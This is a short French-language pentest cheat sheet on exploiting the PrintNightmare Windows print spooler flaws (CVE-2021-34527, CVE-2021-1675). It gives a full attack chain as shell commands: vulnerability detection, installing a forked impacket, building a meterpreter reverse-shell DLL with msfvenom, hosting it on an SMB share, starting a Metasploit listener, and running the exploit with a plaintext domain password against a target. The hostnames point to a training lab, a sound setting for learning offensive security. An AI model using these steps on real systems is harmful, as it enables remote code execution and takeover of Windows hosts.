
[CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) et [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)

Exploite le spooler d'impression


## Netexec

Identifier si la vulnérabilité est présente

```shell
nxc smb <ip> -u '' -p '' -M printnightmare
```


## Cube0x0

https://github.com/cube0x0/CVE-2021-1675


> [!Requis]
> Installer la version d'impacket de cube0x0

1. Installer la bonne version d'impacket

```shell
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

2. Enumérer si `Print System Asynchronous Protocol` et `Print System Remote Protocol` sont exposés sur la target.

```shell
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

3. Génération d'un payload DLL

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

4. Création d'un share hébergeant la DLL

```shell
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

5. Mise en place du listener metasploit

```shell
use exploit/multi/handler
```

```shell
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

```shell
set LHOST 172.16.5.225
```

```shell
set LPORT 8080
```

```shell
run
```

6. Run de l'exploit

```shell
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```
